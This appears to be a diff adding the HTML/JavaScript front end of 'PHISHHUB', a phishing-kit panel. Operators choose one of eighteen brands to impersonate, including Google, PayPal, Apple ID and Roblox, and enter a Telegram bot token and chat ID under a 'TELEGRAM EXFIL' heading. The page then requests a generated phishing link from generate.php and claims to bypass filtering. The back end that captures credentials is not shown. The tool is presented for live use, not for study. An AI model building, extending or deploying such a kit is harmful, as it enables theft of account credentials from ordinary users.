@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHISHHUB | Terminal Interface</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700;800&display=swap');
+        
+        :root {
+            --accent: #ff0000;
+            --accent-dim: #440000;
+            --bg: #000000;
+            --panel: #0a0a0a;
+            --border: #333333;
+        }
+
+        * {
+            border-radius: 0 !important; /* Forces sharp corners everywhere */
+            box-shadow: none !important; /* Removes all glow/shadows */
+        }
+
+        body {
+            background-color: var(--bg);
+            color: #dddddd;
+            font-family: 'JetBrains Mono', monospace;
+            background-image: 
+                linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
+            background-size: 100% 4px;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Scanline effect - kept subtle without glow */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);
+            z-index: 2000;
+            background-size: 100% 2px;
+            pointer-events: none;
+        }
+
+        .terminal-border {
+            border: 1px solid var(--border);
+            position: relative;
+        }
+
+        .terminal-border::before {
+            content: "";
+            position: absolute;
+            top: -1px; left: -1px;
+            width: 10px; height: 10px;
+            border-top: 2px solid var(--accent);
+            border-left: 2px solid var(--accent);
+        }
+
+        .terminal-border::after {
+            content: "";
+            position: absolute;
+            bottom: -1px; right: -1px;
+            width: 10px; height: 10px;
+            border-bottom: 2px solid var(--accent);
+            border-right: 2px solid var(--accent);
+        }
+
+        .target-card {
+            background: #050505;
+            border: 1px solid var(--border);
+            transition: all 0.15s ease;
+            filter: grayscale(1);
+        }
+
+        .target-card:hover {
+            border-color: var(--accent);
+            background: #110000;
+            filter: grayscale(0);
+            transform: translate(-2px, -2px);
+            border-width: 1px;
+        }
+
+        .target-card.active {
+            border-color: var(--accent);
+            background: #220000;
+            filter: grayscale(0);
+            border-width: 2px;
+        }
+
+        .step-locked {
+            opacity: 0.05;
+            pointer-events: none;
+        }
+
+        .btn-action {
+            background: transparent;
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            text-transform: uppercase;
+            font-weight: 800;
+            letter-spacing: 0.2em;
+            transition: all 0.2s;
+        }
+
+        .btn-action:hover {
+            background: var(--accent);
+            color: black;
+        }
+
+        .btn-action:active {
+            transform: translateY(2px);
+        }
+
+        .input-field {
+            background: #0a0a0a;
+            border: 1px solid var(--border);
+            color: var(--accent);
+            padding: 12px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .invert-icon { 
+            filter: invert(1) brightness(1.5) sepia(1) saturate(5) hue-rotate(-50deg); 
+        }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: var(--accent); }
+    </style>
+</head>
+<body class="p-4 md:p-12">
+
+    <div class="max-w-6xl mx-auto">
+        <!-- HEADER -->
+        <header class="flex flex-col md:flex-row justify-between items-start md:items-end mb-20 border-b-2 border-red-900/30 pb-8 relative">
+            <div class="space-y-2">
+                <div class="flex items-center gap-4">
+                    <div class="border-2 border-red-600 p-2 bg-red-950/20">
+                        <span class="text-red-600 font-black text-3xl">PH</span>
+                    </div>
+                    <div>
+                        <h1 class="text-4xl font-black tracking-tighter text-white italic">PHISHHUB</h1>
+                        <p class="text-red-900 text-[10px] uppercase tracking-[0.5em] font-bold">SYSTEM ACCESS GRANTED v6.6.6</p>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-6 md:mt-0 terminal-border p-4 bg-red-950/5">
+                <div class="flex items-center gap-4">
+                    <div class="text-right">
+                        <span class="text-[9px] text-red-900 uppercase font-black tracking-widest block leading-none">STATUS</span>
+                        <span class="text-red-500 text-[11px] font-bold">NODE CONNECTED</span>
+                    </div>
+                    <div class="w-3 h-3 bg-red-600 animate-pulse"></div>
+                </div>
+            </div>
+        </header>
+
+        <div class="space-y-32">
+            
+            <!-- STEP 01: VECTOR -->
+            <section id="sec-1">
+                <div class="flex items-center gap-4 mb-10">
+                    <div class="bg-red-600 text-black font-black px-4 py-1 text-xl italic">01</div>
+                    <h2 class="text-lg font-black uppercase tracking-widest text-red-600">SELECT VECTOR</h2>
+                    <div class="h-[1px] flex-1 bg-red-900/30"></div>
+                </div>
+                
+                <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-4" id="target-grid">
+                    <!-- JS Injected -->
+                </div>
+            </section>
+
+            <!-- STEP 02: CONFIG -->
+            <section id="sec-2" class="step-locked">
+                <div class="flex items-center gap-4 mb-10">
+                    <div class="bg-red-600 text-black font-black px-4 py-1 text-xl italic">02</div>
+                    <h2 class="text-lg font-black uppercase tracking-widest text-red-600">RELAY PROTOCOL</h2>
+                    <div class="h-[1px] flex-1 bg-red-900/30"></div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                    <div class="terminal-border p-8 bg-black col-span-2">
+                        <div class="flex justify-between items-center mb-8 border-b border-red-900/30 pb-4">
+                            <h3 class="text-xs font-black text-red-600 uppercase tracking-widest">TELEGRAM EXFIL</h3>
+                            <span class="text-[9px] text-red-900 font-bold">ENCRYPTED TUNNEL</span>
+                        </div>
+                        
+                        <div class="grid md:grid-cols-2 gap-6">
+                            <div class="space-y-2">
+                                <label class="text-[10px] text-red-900 uppercase font-black">BOT TOKEN</label>
+                                <input type="text" id="tg-token" placeholder="Enter Token" class="w-full input-field mono text-xs">
+                            </div>
+                            <div class="space-y-2">
+                                <label class="text-[10px] text-red-900 uppercase font-black">CHAT ID</label>
+                                <input type="text" id="tg-chat" placeholder="Enter ID" class="w-full input-field mono text-xs">
+                            </div>
+                        </div>
+                        <button onclick="saveConfig()" class="w-full btn-action py-4 mt-8 text-sm">
+                            INITIALIZE HANDSHAKE
+                        </button>
+                    </div>
+
+                    <div class="terminal-border p-8 opacity-20 flex flex-col justify-center items-center text-center">
+                        <span class="text-[10px] text-red-900 uppercase font-black">VOLATILE STORAGE</span>
+                        <p class="text-[9px] mt-4">LOCKED UNAVAILABLE</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 03: DEPLOY -->
+            <section id="sec-3" class="step-locked pb-40">
+                <div class="flex items-center gap-4 mb-10">
+                    <div class="bg-red-600 text-black font-black px-4 py-1 text-xl italic">03</div>
+                    <h2 class="text-lg font-black uppercase tracking-widest text-red-600">EXECUTE DEPLOYMENT</h2>
+                    <div class="h-[1px] flex-1 bg-red-900/30"></div>
+                </div>
+
+                <div class="terminal-border p-12 text-center bg-red-950/5">
+                    <h3 class="text-3xl font-black mb-4 text-white italic">COMPILING PAYLOAD</h3>
+                    <p class="text-red-900 text-xs mb-10 uppercase tracking-[0.3em]">Bypassing edge-layer filtering... Redirection obfuscation: 98%</p>
+                    
+                    <button id="gen-btn" onclick="generateLink()" class="btn-action px-16 py-6 text-lg">
+                        GENERATE LINK
+                    </button>
+
+                    <div id="result-box" class="hidden mt-12">
+                        <div class="border-2 border-red-600 p-4 flex flex-col md:flex-row items-center gap-4 bg-black">
+                            <div class="flex-1 text-left overflow-hidden">
+                                <span class="text-[9px] text-red-900 uppercase block mb-1">Generated URL:</span>
+                                <code id="final-url" class="text-red-500 text-xs font-bold break-all"></code>
+                            </div>
+                            <button onclick="copyToClipboard()" class="btn-action px-8 py-3 text-xs w-full md:w-auto">COPY TO BUFFER</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <script>
+        const targets = [
+            { id: 'google', name: 'GOOGLE', icon: 'https://www.vectorlogo.zone/logos/google/google-icon.svg' },
+            { id: 'microsoft', name: 'OUTLOOK', icon: 'https://www.vectorlogo.zone/logos/microsoft/microsoft-icon.svg' },
+            { id: 'facebook', name: 'FACEBOOK', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
+            { id: 'instagram', name: 'INSTAGRAM', icon: 'https://www.vectorlogo.zone/logos/instagram/instagram-icon.svg' },
+            { id: 'tiktok', name: 'TIKTOK', icon: 'https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg', inv: true },
+            { id: 'snapchat', name: 'SNAPCHAT', icon: 'https://cdn-icons-png.flaticon.com/512/15713/15713438.png' },
+            { id: 'twitter', name: 'X CORP', icon: 'https://cdn-icons-png.flaticon.com/512/11823/11823292.png', inv: true },
+            { id: 'linkedin', name: 'LINKEDIN', icon: 'https://cdn-icons-png.flaticon.com/512/3536/3536505.png' },
+            { id: 'amazon', name: 'AMAZON', icon: 'https://www.vectorlogo.zone/logos/amazon/amazon-icon.svg', inv: true },
+            { id: 'paypal', name: 'PAYPAL', icon: 'https://cdn-icons-png.flaticon.com/512/174/174861.png' },
+            { id: 'netflix', name: 'NETFLIX', icon: 'https://www.vectorlogo.zone/logos/netflix/netflix-icon.svg' },
+            { id: 'apple', name: 'APPLE ID', icon: 'https://www.vectorlogo.zone/logos/apple/apple-icon.svg', inv: true },
+            { id: 'discord', name: 'DISCORD', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968756.png' },
+            { id: 'steam', name: 'STEAM', icon: 'https://www.vectorlogo.zone/logos/steampowered/steampowered-icon.svg' },
+            { id: 'yahoo', name: 'YAHOO', icon: 'https://cdn-icons-png.flaticon.com/512/3955/3955162.png' },
+            { id: 'github', name: 'GITHUB', icon: 'https://cdn-icons-png.flaticon.com/512/733/733609.png', inv: true },
+            { id: 'adobe', name: 'ADOBE', icon: 'https://cdn-icons-png.flaticon.com/512/888/888835.png' },
+            { id: 'roblox', name: 'ROBLOX', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/1280px-Roblox_Corporation_2025_logo.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail&_=20250725012858' }
+        ];
+
+        let state = { target: null, config: false };
+
+        function init() {
+            const grid = document.getElementById('target-grid');
+            targets.forEach(t => {
+                const card = document.createElement('div');
+                card.className = 'target-card p-6 flex flex-col items-center justify-center gap-4 group cursor-pointer';
+                card.innerHTML = `
+                    <img src="${t.icon}" class="w-10 h-10 object-contain transition-all ${t.inv ? 'invert-icon' : ''} group-hover:scale-110">
+                    <span class="text-[9px] font-black uppercase tracking-widest text-red-900 group-hover:text-red-500">${t.name}</span>
+                `;
+                card.onclick = () => selectTarget(t.id, card);
+                grid.appendChild(card);
+            });
+            
+            const savedT = localStorage.getItem('ph_token');
+            const savedC = localStorage.getItem('ph_chat');
+            if(savedT) document.getElementById('tg-token').value = savedT;
+            if(savedC) document.getElementById('tg-chat').value = savedC;
+        }
+
+        function selectTarget(id, el) {
+            state.target = id;
+            document.querySelectorAll('.target-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+            unlockStep(2);
+        }
+
+        function saveConfig() {
+            const t = document.getElementById('tg-token').value.trim();
+            const c = document.getElementById('tg-chat').value.trim();
+            if(!t || !c) return;
+            
+            localStorage.setItem('ph_token', t);
+            localStorage.setItem('ph_chat', c);
+            
+            state.config = true;
+            unlockStep(3);
+        }
+
+        function unlockStep(n) {
+            const sec = document.getElementById(`sec-${n}`);
+            sec.classList.remove('step-locked');
+            const scrollPos = sec.getBoundingClientRect().top + window.pageYOffset - 100;
+            window.scrollTo({ top: scrollPos, behavior: 'smooth' });
+        }
+
+        async function generateLink() {
+            const token = document.getElementById('tg-token').value;
+            const chat = document.getElementById('tg-chat').value;
+            const btn = document.getElementById('gen-btn');
+
+            btn.innerText = "OVERRIDING FILTERS...";
+            btn.disabled = true;
+
+            const formData = new FormData();
+            formData.append('token', token);
+            formData.append('chatId', chat);
+            formData.append('template', state.target);
+
+            try {
+                const response = await fetch('generate.php', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.slug) {
+                    const urlBox = document.getElementById('result-box');
+                    const urlText = document.getElementById('final-url');
+                    const cleanUrl = `${window.location.origin}/v/${result.slug}/`;
+                    
+                    urlText.innerText = cleanUrl;
+                    urlBox.classList.remove('hidden');
+                    
+                    btn.innerText = "LINK DEPLOYED";
+                    btn.style.borderColor = "#333";
+                    btn.style.color = "#333";
+                }
+            } catch (error) {
+                btn.innerText = "RELAY TIMEOUT";
+                btn.disabled = false;
+            }
+        }
+
+        function copyToClipboard() {
+            const txt = document.getElementById('final-url').innerText;
+            const el = document.createElement('textarea');
+            el.value = txt;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            
+            const btn = event.target;
+            btn.innerText = "COPIED";
+            setTimeout(() => btn.innerText = "COPY TO BUFFER", 2000);
+        }
+
+        init();
+    </script>
+</body>
+</html>
